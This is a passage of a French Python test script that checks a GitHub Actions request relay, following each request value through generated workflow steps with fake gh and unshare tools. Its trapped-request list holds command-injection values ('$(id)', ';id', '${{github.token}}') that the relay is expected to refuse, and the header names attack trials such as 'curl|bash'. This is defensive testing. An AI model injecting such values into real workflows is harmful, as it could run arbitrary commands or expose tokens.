#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EPREUVES_DU_RELAIS_DES_SERIES — Dim 08-11-2026 (Paris). Simulation uniquement.

LE SENS EN TÊTE. Une seule propriété : CE QUE LIT LE JOUEUR = CE QUE DIT LA DEMANDE (et la table des séries pour ce
que la demande ne dit pas). Le lot 262 a été arrêté (relevé du Chat n°298, 07-11-2026) parce qu'à chaque tour un
relecteur neuf trouvait un nouvel endroit où deux réglages s'intervertissaient sans qu'aucune épreuve ne rougisse
(D-10, N-1, J1/J2, NV-1, NV-2). Cette épreuve suit donc chaque valeur d'une demande à travers TOUS les passages, tels
que le fabricant les écrit, jusqu'à la fonction de lecture du joueur lui-même ; ses sabotages intervertissent deux
valeurs à chaque passage, et chacun doit la faire rougir.

① RÔLE — Éprouver, au dépôt, la chaîne « fichier de demande → relais demande_de_serie.yml → bouton du circuit des
  séries → pas « Fabriquer la matrice » → pas « Jouer la part » et « Rassembler » → lecture des arguments par
  tests/outils/jouer_une_part.py et tests/outils/rassembler_les_parts.py », et le filet du fabricant pour le relais
  (méthode du bloc 2 du 08-11-2026, actions 3 à 5 ; choix n°347 : Q1 = 1, Q2 = 1, Q3 = 1, Q5 = 1).
② CONTEXTE D'APPEL — Chaque nuit par la certification (épreuve de tests/ qui accepte --saboter) ; à la main avant
  toute livraison qui touche le fabricant du circuit public, la table des séries, le joueur ou le rassembleur des
  parts (R-731) : python3 tests/EPREUVES_DU_RELAIS_DES_SERIES_Dim_08-11-2026.py <racine> [--saboter]
③ ENTRÉE — La racine d'un dépôt : on y prend programmes/FABRIQUER_LE_CIRCUIT_PUBLIC.py (ses gabarits RELAIS et SERIES,
  son filet), tests/LANCEMENT_DES_EPREUVES.json (la table), tests/outils/jouer_une_part.py et
  tests/outils/rassembler_les_parts.py (leur `lire_les_arguments`).
④ CONDITIONS D'ENTRÉE — bash, git et jq installés (comme sur les machines de GitHub) ; aucun réseau.
⑤ SORTIE — Le code de sortie : 0 si chaque cas (T, V, P, L, F ci-dessous) donne la réponse attendue et, avec
  --saboter, si chaque sabotage en fait échouer au moins un, et pour un sabotage dont la faute est nommée
  (FAUTES_ATTENDUES) celle-là ; 1 sinon ; 2 si un sabotage ne s'applique plus, ou si le TÉMOIN (la copie construite
  comme celle d'un sabotage, NON sabotée, jouée d'abord) rougit : la copie elle-même serait fausse.
  [rend: 1]
⑥ TRAITEMENT — GitHub est imité ainsi : pour chaque demande, un vrai dépôt git (la branche publique), un commit qui
  porte la demande ; le script du pas « relayer » est EXTRAIT du relais fabriqué et joué par « bash -e -o pipefail »
  (le shell de « shell: bash ») avec l'environnement de son bloc « env: », dont chaque expression « ${{ … }} » est
  remplacée par la valeur du contexte imité (github.event.before, github.sha, github.ref_name…) ; « gh » est un faux
  qui note ses arguments et, à « run list », applique avec jq le filtre « --jq » reçu à une liste JSON de passages
  imités (tour 2, N1 de Cowork : chaque état non fini, in_progress, queued, waiting, pending ou requested, est vu ;
  depuis l'étape FILE-2, 20-11-2026, P27 n'est plus un refus : la demande part sur les places libres). Les arguments de « gh workflow run » deviennent les entrées du bouton, contrôlées comme
  GitHub le ferait contre les entrées DÉCLARÉES du circuit des séries fabriqué (inconnue, choix hors liste, nombre
  illisible : refus ; absente : valeur par défaut). Le pas « Fabriquer la matrice », extrait du même fichier fabriqué,
  est joué avec ces entrées sur une copie minimale de la version (la table, le joueur des parts, un fichier vide par
  épreuve de la table) ; sa sortie « matrice » donne, ligne par ligne, l'environnement du pas « Jouer la part », joué
  avec un faux « unshare » qui note la ligne de commande ; cette ligne est lue par `lire_les_arguments` DU JOUEUR
  (Q3 = 1) ; de même « series » → « Rassembler » → `lire_les_arguments` du rassembleur. L'attendu est calculé à
  part, depuis la demande et la table lue en JSON par cette épreuve.
  T0 (cas réel, R-732) : la table de la racine dit, pour HL et Yahoo, l'épreuve, les machines et le lot du circuit
  en service avant le 08-11-2026 (series_longues.yml publié : entrées parts_hl 18, lot_hl 6, parts_yahoo 2,
  lot_yahoo 21 ; motifs "HISTORIQUE_LONG" et "COURS_PROPRE_DE_YAHOO" du pas matrice) — le TÉMOIN ci-dessous.
  Depuis le 11-11-2026 (plan V7, bloc 2bis), T0 ne compare que les séries du témoin : la table en porte d'autres.
  V (demandes valides) : V1 la demande réelle prévue au premier passage (méthode §4, action 7 : Yahoo, 2 machines,
  lots de 21) sur main · V2 « toutes », quatre nombres tous différents entre eux et des valeurs de la table, sur une
  version en attente · V3 HL seul, sans nombre (valeurs de la table), avec une ligne vide, un commentaire et sans fin
  de ligne finale · V4 « a_blanc=oui » : rien n'est lancé, le journal dit les valeurs · V5 Yahoo, clés dans un autre
  ordre. Pour chaque V : un seul « gh workflow run », sur la branche, version = branche ; chaque part 0..n-1 lue une
  fois ; nb_parts, lot, épreuve et relevé lus par le joueur = l'attendu ; épreuve et relevé lus par le rassembleur =
  ceux des parts de la même série ; les séries jouées = celles demandées.
  P (demandes piégées, chacune refusée, SANS aucun « gh workflow run », et pour SA raison : un fragment du message) :
  accent, tabulation, retour chariot, DEL, octet nul, valeur trop longue, clé donnée deux fois (NV-2), clé
  « version » d'une autre branche (P08), « ; », « $( ) », « ${{ }} », série inconnue ou à la mauvaise
  casse, nombres 0, 100 et 07, clé « serie » absente, « a_blanc » faux, deux fichiers dans le commit, deux commits
  dans la poussée, un nom hors de demandes/SERIE_<date>.txt, un fichier modifié et non ajouté, une branche créée par
  la poussée, une branche qui n'est pas une version, plus de 1 000 octets.
  Q (le réservoir, étape FILE-2, 20-11-2026 ; décisions de Jean-Luc A-884 ②, A-888 et du 20-11-2026 à 20h52) : JAMAIS
  un refus pour un passage en cours ; la demande part avec « premiere_place » et « nombre_de_places », la première place
  étant celle que rend un ORACLE écrit ici (`attendu_premiere` : la fenêtre de places consécutives la moins chargée,
  la charge lue dans le titre « … places p+n » des passages non finis des trois circuits longs, un titre sans places
  ignoré), et, pour Q1 à Q6 et Q9, une valeur écrite à la main qui doit être celle de l'oracle. Q1 une autre demande
  sur 1+3 · Q2 un titre sans places · Q3 3+4 et 1+18 · Q4 une fenêtre qui tourne (16+5) · Q5 la certification (1+15)
  · Q6 deux circuits · Q8 les titres des trois circuits · Q9 un titre « 08+3 » ignoré (D-2 de Cowork : « 08 » lu en
  octal arrêtait le compte) · Q5bis le titre de la certification porte ses places · Q7 les trois fiches longues sont
  des fiches du réservoir. Le pas matrice des séries (V) doit écrire la place de chaque entrée. S19 remet le refus
  global, S74, S75, S78, S79 faussent le choix ou sa transmission.
  E (l'examen à la demande, décision de Jean-Luc du 08-11-2026 à 18h06) : E0 le circuit de certification a un bouton
  sans entrée obligatoire · E1 « circuit=examen » sur main → un seul « gh workflow run certifier_la_version.yml --ref
  main », sans réglage de série, sur les places 1+TRANCHES_DE_LA_NUIT · E2 à blanc → rien · E3 depuis une version en
  attente, E4 avec un réglage de série, E6 circuit inconnu, E7 clé circuit absente → refusés ; E5 un examen en attente
  → lancé. Les demandes des cas V et P reçoivent « circuit=series » et « version=<branche> » en tête (`relayer`).
  K (18-11-2026, A-897/A-898, troisième superviseur R-759 « ARRÊTER ET SIMPLIFIER » ; fusionné le 25-11-2026 avec
  l'étape FILE-2 de main) : le relais n'est jamais refusé pour un passage en cours et lance aussitôt (K1 : un passage
  des séries en attente, lecture des trois circuits longs puis un lancement) ; K2 au bouton (« workflow_dispatch »), la
  demande ajoutée par le dernier commit est examinée et lancée ; K3 au bouton sur un commit de code → refusé ; K4 la
  fiche du circuit visé sans « queue: max » → refusé, rien lancé (essai réel du 18-11-2026 : un passage sans « queue:
  max » annule celui qui attend) ; K5 « queue: max » écrit hors de « concurrency: » → refusé ; K6 la fiche absente de
  la branche → refusé ; K7 un lancement refusé par GitHub → rouge ; K8 une demande de plus de 24 h, K9 un nom dans le
  futur → refusés ; K10 la fiche visée à « cancel-in-progress: true » → refusée (T4 du RELU du 18-11-2026) ; P37 la clé
  version absente → refusée ; chaque lancement finit par « -f demande=DEMANDE_<heure>@<branche> » (le titre du passage).
  T (25-11-2026, point T1 du RELU de travail-file-demandes : les anciens relais sans « queue: max », publiés sur des
  branches publiques, partagent le groupe « demande-de-serie ») : T1a le relais de la branche est l'ANCIEN (groupe
  demande-de-serie, sans « queue: max », tel que relevé sur travail-t54) → refusé ; T1b le relais à « queue: max »
  mais sous l'ancien nom → refusé ; T1c le relais du groupe neuf sans « queue: max » → refusé ; T1d le groupe du relais
  fabriqué n'est pas l'ancien nom ; D9 DEPOSER_UNE_DEMANDE.py sur une branche publique au relais ancien → refusé,
  rien poussé ; D10 (T5) une poussée refusée par un crochet, la branche n'ayant pas avancé → refus affiché en
  entier, un seul essai, code 2, sans aucun accès en clair (adresse, forme d'un jeton) ; D11 le module du masque
  illisible → code 2, refus non affiché, rien poussé. (RELU du 25-11-2026) D12 (C1) une course perdue — un crochet
  pousse un commit intrus sur la branche puis refuse — → un nouvel essai, déposé au-dessus de l'intrus, code 0 ; D13
  (C4) une poussée sans réponse dans le délai (crochet lent, délai réduit par DEPOSER_DELAI_DE_GIT_EN_SECONDES) →
  code 2, « elle a PU aboutir » ; D14 (N3) la branche illisible après un refus → code 2, rien retenté ; D15 (N1, N2)
  un refus long, deux adresses à accès, l'une au début et l'autre à la fin → affiché du début à la fin, les deux
  masquées ; K11 (E2) la fiche visée à « cancel-in-progress » autre que « false » (« True », « ${{ true }} », « yes »)
  → refusée ; D16 (superviseur R-759) l'examen sans réponse dans le délai → code 2, rien poussé. G5 le gabarit du relais : groupe FIXE GROUPE_DU_RELAIS, « queue: max », « cancel-in-progress: false » ;
  G1 déclencheurs push sur demandes/ et bouton, rien d'autre. D0 à D16 : programmes/DEPOSER_UNE_DEMANDE.py (nom, pointe
  lue au privé, examen du relais avant la poussée ; D2 : la demande déposée est lancée par le relais).
  L (lecture du joueur et du rassembleur) : L1 « --lot » donné deux fois → refusé (NV-2) · L2 « --lot » absent →
  refusé (plus de valeur cachée) · L3 « --depuis » deux fois au rassembleur → refusé.
  F (le filet du fabricant) : F0 il accepte les gabarits fabriqués · F1 relais + une ligne qui porte la clé · F2
  relais + « ${{ … }} » dans son script · F3 relais + un programme du dépôt lancé · F4 relais + « defaults: » · F5
  le gabarit des séries + « actions: write » · F6 le gabarit des séries + le motif tapé « HISTORIQUE_LONG » (NV-1) ·
  (tour 2, I-2) F7 relais + clonage du dépôt privé · F8 « run: » sans bloc · F9 un pas « run » sans « shell: bash » ·
  F10 « $GITHUB_ENV » · F11 une poussée · F12 un second job aux pas indentés de huit qui lance python3 et une
  expression (cas du relecteur, B1) · F13 la clé écrite par un échappement YAML · F14 « permissions » au niveau du
  job : chacun refusé — depuis le tour 3 (superviseur R-759, « ARRÊTER ET SIMPLIFIER »), tous pour la même raison :
  le relais n'est pas, octet pour octet, le texte fabriqué.
  A (tour 3) : les essais du superviseur (uses tiers, curl|bash, awk system, alias de git, gh api, gh extension
  install, checkout tiers et tar, self-hosted, core.pager, une espace ajoutée) → refusés par l'empreinte ; A0 le
  relais fabriqué accepté. R (tour 3) : `refus_des_circuits_publies` sur un clone public d'essai : R1 les circuits
  fabriqués → 0 refus ; R2 relais modifié, R3 autre circuit avec actions: write, R4 write-all, R5 entre guillemets,
  R6 copie exacte du relais sous un autre nom, R7 (tour 4) un circuit sans « permissions: », R8 (tour 4)
  « Actions: Write » → 1 refus chacun. Tour 3, sur la relecture de Cowork du tour 2 : V6
  une demande d'exactement 1 000 octets passe (C3) ; P29 un passage en attente derrière 30 passages finis est vu (le
  faux gh applique « --limit », C7) ; (A-811, 15-11-2026) V2 porte une pointe, V7 main avec une pointe : la pointe
  arrive telle quelle à l'entrée « pointe » du bouton ; P30 une version en attente sans pointe, P31 abrégée, P36 en
  majuscules, P33 de 41 caractères, P34 donnée deux fois, E8 un examen avec une pointe → refusés pour leur raison ;
  G1 à G4 les réglages du GABARIT du relais, que l'empreinte ne garde pas :
  déclencheur push sur demandes/ seul (N5), ubuntu-latest (N5), fetch-depth 2 et persist-credentials false (N7), gh
  employé seulement pour « run list » et « workflow run », un seul job (N6).
  V0 (tour 2, I-1) : le bouton appuyé sans relais, seule la version donnée : les défauts DÉCLARÉS du bouton mènent
  le joueur aux valeurs de la table. P28 (tour 2, m-3) : une demande qui règle une série qu'elle ne joue pas. Le
  rassembleur : « --depuis » et « --travail » comparés aussi (tour 2, m-2).
⑦ UNITÉ — Des codes de sortie.
⑧ POURQUOI — Méthode du bloc 2, action 5 (« UNE épreuve qui suit chaque valeur de la demande jusqu'au joueur ») ;
  décision n°309 ; le lot 262 arrêté (n°298). Une épreuve qui reste verte quand on retire ce qu'elle teste n'est pas
  une preuve : d'où un sabotage par passage, qui intervertit deux valeurs.
⑨ CE QUI CLOCHE — Rien n'est joué sur GitHub (la file « queue: max » de GitHub a été mesurée à part, le 18-11-2026,
  sur les branches publiques essai-queue-refs-*-18-11-2026 ; commentaire de GROUPE_DU_RELAIS du fabricant) : le déclencheur « push », le filtre « paths », la permission
  « actions: write », le vrai « gh », la conversion par GitHub des entrées « number » et de la matrice JSON en texte
  sont IMITÉS (niveau 1 et 2 de la méthode, action 7). Le pas matrice tourne sous bash et non sous ETAPE_MUETTE.
  « LC_ALL=C » du relais n'est pas éprouvé seul : le contrôle ASCII le précède et refuse tout octet hors de l'ASCII
  (seule la locale « C.utf8 » existe sur la machine du Chat).
⑩ EFFET — Écrit dans des dossiers jetables, effacés à la fin.
⑪ TERMINAISON — Rend la main ; chaque lancement est borné à 120 secondes ; sort par sys.exit.
  [sort: oui]
"""
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

_args = [a for a in sys.argv[1:] if not a.startswith("--")]
DEPOT = os.path.abspath(_args[0] if _args else ".")
FABRICANT = "programmes/FABRIQUER_LE_CIRCUIT_PUBLIC.py"
TABLE = "tests/LANCEMENT_DES_EPREUVES.json"
JOUEUR = "tests/outils/jouer_une_part.py"
RASSEMBLEUR = "tests/outils/rassembler_les_parts.py"
JOUEUR_D_EPREUVE = "tests/outils/jouer_une_epreuve_longue.py"   # 15-11-2026 (GHUB ②) : la matrice des épreuves longues
DEPOSEUR = "programmes/DEPOSER_UNE_DEMANDE.py"     # 18-11-2026 (A-897/A-898) : le dépôt d'une demande
JETON = "programmes/FORME_D_UN_JETON.py"     # 25-11-2026 (T5) : le motif de jeton que DEPOSER charge par son chemin
# (via le fabricant, forme_d_un_jeton) pour masquer un refus de poussée. Copié avec les autres dans chaque copie
# sabotée : sans lui, D10 tombe sur FileNotFoundError dans TOUTE copie, et chaque sabotage « mord » pour cette
# seule raison (mesuré le 25-11-2026 sur S107 : « No such file or directory: …/FORME_D_UN_JETON.py »).
GIT_ENV = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1", GIT_AUTHOR_NAME="essai",
               GIT_AUTHOR_EMAIL="essai@exemple.invalid", GIT_COMMITTER_NAME="essai",
               GIT_COMMITTER_EMAIL="essai@exemple.invalid")
# LE TÉMOIN (R-732, cas réel) : ce que le circuit en service jouait avant le 08-11-2026, lu ce jour-là dans
# .github/workflows/series_longues.yml du dépôt (entrées du bouton l.65-80, motifs du pas matrice l.228) et dans la
# table (clés de « series_hors_de_la_nuit »). Recopié VOLONTAIREMENT : c'est la référence fixe qui fait rougir une
# table où deux séries ont échangé leur épreuve ou leurs réglages (la table seule ne peut pas se contredire).
TEMOIN = {"HL": ("tests/EPREUVES_DE_L_HISTORIQUE_LONG_Dim_04-10-2026.py", 18, 6),
          "Yahoo": ("tests/EPREUVES_DU_COURS_PROPRE_DE_YAHOO_Jeu_22-10-2026.py", 2, 21)}
# LE TÉMOIN DU RELAIS ANCIEN (25-11-2026, point T1 du RELU de travail-file-demandes ; R-732, une vraie ligne) : le nom
# du groupe de concurrence du relais publié AVANT ce travail, encore présent sur des branches publiques (relevé du
# relecteur, 18-11-2026 : « group: demande-de-serie | cancel-in-progress: false | » sur travail-t54 et dix autres ;
# 26 branches hors main au relevé du 25-11-2026 à 13h23, BACKLOG A-988). Recopié VOLONTAIREMENT : c'est la référence
# fixe qui fait rougir un relais fabriqué qui reprendrait ce nom (T1d) ; le lire dans le fabricant ne prouverait rien.
ANCIEN_GROUPE_DU_RELAIS = "demande-de-serie"
HORODATAGE = r"(?:Lun|Mar|Mer|Jeu|Ven|Sam|Dim)_[0-9]{2}-[0-9]{2}-[0-9]{4}_[0-9]{2}h[0-9]{2}"
# Le nom des demandes des cas : l'heure de Paris du lancement de l'épreuve (18-11-2026 : une demande dont le nom a
# plus de 24 h est refusée ; l'ancien nom fixe du 08-11-2026 l'aurait été).
import datetime as _dt
import zoneinfo as _zi
_MAINTENANT = _dt.datetime.now(_zi.ZoneInfo("Europe/Paris"))
HEURE = _MAINTENANT.strftime("%Y-%m-%d_%Hh%M")
NOM = f"demandes/DEMANDE_{HEURE}.txt"
NOM_PERIME = "demandes/DEMANDE_" + (_MAINTENANT - _dt.timedelta(hours=25)).strftime("%Y-%m-%d_%Hh%M") + ".txt"
NOM_FUTUR = "demandes/DEMANDE_" + (_MAINTENANT + _dt.timedelta(hours=2)).strftime("%Y-%m-%d_%Hh%M") + ".txt"
# Le faux gh (tour 2, relecture de Cowork du 08-11-2026, N1) : à « run list », il rend la LISTE JSON des passages
# imités (FAUX_GH_PASSAGES) passée par le filtre « --jq » qu'il a reçu, appliqué par jq, comme le vrai gh ; avant,
# il imprimait un compte tout fait et le filtre du relais n'était jamais éprouvé.
FAUX_GH = '''#!/usr/bin/env python3
import json, os, subprocess, sys
a = sys.argv[1:]
with open(os.environ["FAUX_GH_JOURNAL"], "a", encoding="utf-8") as f:
    f.write(json.dumps({"args": a, "repo": os.environ.get("GH_REPO"), "jeton": os.environ.get("GH_TOKEN")}) + "\\n")
if a[:2] == ["workflow", "run"] and os.environ.get("FAUX_GH_REFUS") == "1":
    sys.exit("faux gh : lancement refuse")
if a[:2] == ["run", "list"]:
    # étape FILE-2 (20-11-2026) : le relais lit l'état et le titre (qui porte les places) de chaque passage
    if "--jq" not in a or "--json" not in a or a[a.index("--json") + 1] != "status,displayTitle":
        sys.exit("faux gh : run list sans --json status,displayTitle ou sans --jq")
    passages = json.loads(os.environ.get("FAUX_GH_PASSAGES", "[]"))
    if isinstance(passages, dict):   # 15-11-2026 (GHUB ②) : des passages propres à chaque circuit
        passages = passages.get(a[a.index("--workflow") + 1], []) if "--workflow" in a else []
    if "--limit" in a:
        passages = passages[:int(a[a.index("--limit") + 1])]   # le plus récent d'abord, comme gh
    p = subprocess.run(["jq", "-r", a[a.index("--jq") + 1]], input=json.dumps(passages),
                       capture_output=True, text=True)
    sys.stdout.write(p.stdout)
    sys.exit(p.returncode)
'''
FAUX_UNSHARE = '''#!/usr/bin/env python3
import json, os, sys
with open(os.environ["FAUX_UNSHARE_JOURNAL"], "a", encoding="utf-8") as f:
    f.write(json.dumps(sys.argv[1:]) + "\\n")
sys.exit(int(os.environ.get("FAUX_UNSHARE_CODE", "0")))
'''

# Les demandes : (nom, branche, texte, attendu) ; attendu = None (acceptée) ou le fragment du message de refus.
# Les cas de forme de la poussée (deux fichiers, deux commits…) sont traités à part dans `tour`.
VALIDES = [
    ("V1 la demande réelle du premier passage", "main", "serie=Yahoo\nparts_yahoo=2\nlot_yahoo=21\n"),
    ("V2 toutes, quatre nombres distincts", "travail-essai",
     "serie=toutes\npointe=1c5302a94959b9702e41bb49b13c7a5220a6da43\nparts_hl=3\nlot_hl=13\nparts_yahoo=4\n"
     "lot_yahoo=11\n"),
    # V7 (A-811, 15-11-2026) : main avec sa pointe — la pointe vraie d'une version en attente le 15-11-2026 (QE2)
    ("V7 main avec une pointe", "main", "serie=HL\npointe=1c5302a94959b9702e41bb49b13c7a5220a6da43\n"),
    ("V3 HL seul, valeurs de la table", "main", "# premier essai\n\nserie=HL"),
    ("V4 a blanc", "main", "serie=toutes\nparts_hl=5\nlot_hl=9\na_blanc=oui\n"),
    ("V5 clés dans un autre ordre", "main", "lot_yahoo=7\nparts_yahoo=5\nserie=Yahoo\n"),
]
PIEGEES = [
    ("P01 accent", "serie=Yahoo\nlot_yahoo=7é\n", "ASCII"),
    ("P02 tabulation", "serie=Yahoo\nlot_yahoo=\t7\n", "ASCII"),
    ("P03 retour chariot", "serie=Yahoo\r\nlot_yahoo=7\r\n", "ASCII"),
    ("P04 DEL", "serie=Yahoo\x7f\n", "ASCII"),
    ("P05 octet nul", "serie=Yahoo\x00\n", "ASCII"),
    ("P06 valeur de 21 caractères", "serie=" + "A" * 21 + "\n", "illisible"),
    ("P07 clé donnée deux fois (NV-2)", "serie=HL\nlot_hl=13\nlot_hl=11\n", "deux fois"),
    ("P08 version d'une autre branche", "serie=HL\nversion=travail-x\n", "n'est pas la branche"),
    ("P09 point-virgule", "serie=HL;id\n", "illisible"),
    ("P10 substitution", "serie=$(id)\n", "illisible"),
    ("P11 expression de GitHub", "serie=${{github.token}}\n", "illisible"),
    ("P12 série à la mauvaise casse", "serie=hl\n", "serie inconnue"),
    ("P13 série inconnue", "serie=lesdeux\n", "serie inconnue"),
    ("P14 nombre 0", "serie=HL\nparts_hl=0\n", "1 a 99"),
    ("P15 nombre 100", "serie=HL\nlot_hl=100\n", "1 a 99"),
    ("P16 nombre 07", "serie=Yahoo\nparts_yahoo=07\n", "1 a 99"),
    ("P17 clé serie absente", "parts_hl=3\n", "manque"),
    ("P18 a_blanc faux", "serie=HL\na_blanc=peut\n", "a_blanc"),
    ("P19 plus de 1000 octets", "serie=HL\n" + "#" * 79 + "\n" * 1 + ("#" * 79 + "\n") * 12, "octets"),
    ("P20 espace autour du signe égal", "serie = HL\n", "illisible"),
    ("P28 elle règle une série qu'elle ne joue pas (m-3)", "serie=HL\nparts_yahoo=5\n", "qu'elle ne joue pas"),
    # A-811 (15-11-2026) : la pointe a SON motif, 40 caractères hexadécimaux en minuscules, et ne vient qu'une fois
    ("P31 pointe abrégée", "serie=HL\npointe=1c5302a9\n", "pointe de 40"),
    ("P36 pointe en majuscules", "serie=HL\npointe=1C5302A94959B9702E41BB49B13C7A5220A6DA43\n", "pointe de 40"),
    ("P33 pointe de 41 caractères", "serie=HL\npointe=1c5302a94959b9702e41bb49b13c7a5220a6da431\n", "pointe de 40"),
    ("P34 pointe donnée deux fois", "serie=HL\npointe=1c5302a94959b9702e41bb49b13c7a5220a6da43\n"
     "pointe=1c5302a94959b9702e41bb49b13c7a5220a6da43\n", "deux fois"),
]


def lancer(args, env=None, cwd=None, entree=None):
    """Lance une commande ; rend (code, sortie et erreur réunies).

    ① RÔLE — Un lancement borné. ② CONTEXTE D'APPEL — Partout. ③ ENTRÉE — `args`, `env` (GIT_ENV par défaut), `cwd`,
    `entree` (texte envoyé sur l'entrée). ④ CONDITIONS D'ENTRÉE — —
    ⑤ SORTIE — DEUX valeurs : le code, le texte. [rend: 2]
    ⑥ TRAITEMENT — subprocess.run, borné à 120 s. ⑦ UNITÉ — — ⑧ POURQUOI — —
    ⑨ CE QUI CLOCHE — Un dépassement lève TimeoutExpired : l'épreuve sort sur une trace, code non nul.
    ⑩ EFFET — Ce que fait la commande. ⑪ TERMINAISON — Rend la main ; 120 s au plus. [sort: non]
    """
    p = subprocess.run(args, capture_output=True, text=True, env=env or GIT_ENV, cwd=cwd, timeout=120, input=entree,
                       errors="replace")
    return p.returncode, p.stdout + p.stderr


def charger(chemin, nom):
    """Charge un programme comme un module.

    ① RÔLE — Appeler les fonctions de la racine éprouvée. ② CONTEXTE D'APPEL — `tour`. ③ ENTRÉE — `chemin`, `nom`.
    ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : le module. [rend: 1] ⑥ TRAITEMENT — importlib ; le dossier du
    programme est mis en tête de sys.path le temps de l'import (le rassembleur importe jouer_une_part par son nom).
    ⑦ UNITÉ — — ⑧ POURQUOI — Q3 = 1 : lire avec la fonction du joueur lui-même.
    ⑨ CE QUI CLOCHE — Le code de tête du programme s'exécute (le fabricant lit la table à l'import) ; un module
    « jouer_une_part » déjà importé d'une autre racine serait repris : il est retiré de sys.modules avant.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main, ou lève. [sort: non]
    """
    sys.modules.pop("jouer_une_part", None)
    sys.path.insert(0, os.path.dirname(chemin))
    try:
        spec = importlib.util.spec_from_file_location(nom, chemin)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
    finally:
        sys.path.pop(0)
    return module


def pas_du_gabarit(texte, ident):
    """Rend (environnement brut, script) du premier pas d'identifiant `ident` d'un circuit fabriqué.

    ① RÔLE — Jouer le pas tel que le circuit le porte, sans le recopier.
    ② CONTEXTE D'APPEL — `tour`, pour « relayer », « matrice », « jouer_la_part », « rassembler ».
    ③ ENTRÉE — `texte` : le fichier de circuit ; `ident` : la valeur de « id: ».
    ④ CONDITIONS D'ENTRÉE — Le pas porte « id: », puis éventuellement « env: », puis « run: | ».
    ⑤ SORTIE — DEUX valeurs : {nom : valeur écrite} du bloc « env: » du pas, et le script (sans son indentation) ;
      (None, "") si le pas manque. [rend: 2]
    ⑥ TRAITEMENT — lecture par indentation : la ligne « id: <ident> », le bloc « env: » à la même marge, ses lignes
      « NOM: valeur » plus indentées, puis « run: | » et les lignes plus indentées que lui.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête.
    ⑨ CE QUI CLOCHE — Pas un lecteur YAML ; une valeur d'environnement entre guillemets garde ses guillemets.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    lignes = texte.split("\n")
    debut = [i for i, l in enumerate(lignes) if l.strip() == "id: " + ident]
    if not debut:
        return None, ""
    i = debut[0]
    marge = len(lignes[i]) - len(lignes[i].lstrip())
    env = {}
    while i < len(lignes) and lignes[i].strip() != "run: |":
        if lignes[i].strip() == "env:" and len(lignes[i]) - len(lignes[i].lstrip()) == marge:
            k = i + 1
            while k < len(lignes) and len(lignes[k]) - len(lignes[k].lstrip()) > marge:
                nom, _, valeur = lignes[k].strip().partition(": ")
                env[nom] = valeur
                k += 1
            i = k
            continue
        i += 1
    if i == len(lignes):
        return None, ""
    corps = []
    for l in lignes[i + 1:]:
        if l.strip() and len(l) - len(l.lstrip()) <= marge:
            break
        corps.append(l[marge + 2:])
    return env, "\n".join(corps) + "\n"


def resoudre(env, contexte):
    """Remplace chaque valeur « ${{ expression }} » d'un bloc « env: » par sa valeur dans le contexte imité.

    ① RÔLE — Imiter GitHub, qui remplace les expressions d'un bloc « env: » avant de lancer le pas.
    ② CONTEXTE D'APPEL — `tour`, avant chaque pas joué.
    ③ ENTRÉE — `env` : {nom : valeur écrite} ; `contexte` : {expression : valeur}.
    ④ CONDITIONS D'ENTRÉE — —
    ⑤ SORTIE — UNE valeur : {nom : texte}. Lève KeyError pour une expression absente du contexte. [rend: 1]
    ⑥ TRAITEMENT — une valeur qui est exactement « ${{ x }} » prend contexte[x], convertie en texte comme GitHub (un
      entier « 3 », un texte tel quel) ; une autre valeur reste telle quelle.
    ⑦ UNITÉ — — ⑧ POURQUOI — Un sabotage qui branche une variable sur une autre expression doit changer la valeur lue.
    ⑨ CE QUI CLOCHE — Une expression composée (« a || b ») n'est pas évaluée : elle lève KeyError.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main, ou lève. [sort: non]
    """
    sortie = {}
    for nom, valeur in env.items():
        m = re.fullmatch(r"\$\{\{ ([^}]+) \}\}", valeur)
        sortie[nom] = str(contexte[m.group(1)]) if m else valeur
    return sortie


def entrees_declarees(series):
    """Rend {nom : (type, options, défaut, obligatoire)} des entrées « workflow_dispatch » du circuit des séries.

    ① RÔLE — Imiter le contrôle que GitHub fait des entrées données à « gh workflow run ».
    ② CONTEXTE D'APPEL — `tour`, une fois.
    ③ ENTRÉE — `series` : le texte du circuit des séries fabriqué.
    ④ CONDITIONS D'ENTRÉE — Le bloc « inputs: » à quatre espaces, chaque entrée à six, ses clés à huit.
    ⑤ SORTIE — UNE valeur : le dictionnaire. [rend: 1]
    ⑥ TRAITEMENT — lecture par indentation ; « options » lu en JSON ; « default » sans ses guillemets.
    ⑦ UNITÉ — — ⑧ POURQUOI — Une entrée envoyée mais non déclarée est refusée par GitHub ; une entrée déclarée et non
      envoyée prend son défaut : l'attendu dépend des deux.
    ⑨ CE QUI CLOCHE — Pas un lecteur YAML.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    lignes = series.split("\n")
    i = lignes.index("    inputs:") + 1
    entrees, nom = {}, None
    while i < len(lignes) and (lignes[i].startswith("      ") or not lignes[i].strip()):
        l = lignes[i]
        m = re.match(r"^      ([a-z_]+):$", l)
        if m:
            nom = m.group(1)
            entrees[nom] = {"type": "string", "options": None, "default": None, "required": False}
        m = re.match(r"^        (type|options|default|required): (.*)$", l)
        if m and nom:
            cle, v = m.groups()
            entrees[nom][cle] = (json.loads(v) if cle == "options" else v.strip('"') if cle == "default" else
                                 v == "true" if cle == "required" else v)
        i += 1
    return entrees


def tour(racine):
    """Joue tous les cas sur une racine ; rend la liste des cas faux (vide : tout est conforme).

    ① RÔLE — Le corps de l'épreuve (fiche en tête, ⑥).
    ② CONTEXTE D'APPEL — `main`, une fois sur la racine, puis une fois par copie sabotée.
    ③ ENTRÉE — `racine`.
    ④ CONDITIONS D'ENTRÉE — Fiche en tête, ④.
    ⑤ SORTIE — UNE valeur : la liste des cas faux, chacun avec ce qui a été lu. [rend: 1]
    ⑥ TRAITEMENT — Fiche en tête, ⑥.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête.
    ⑨ CE QUI CLOCHE — Une erreur imprévue d'un cas (pas extrait absent, expression inconnue…) est rangée parmi les
      cas faux avec son message : elle ne fait jamais passer l'épreuve.
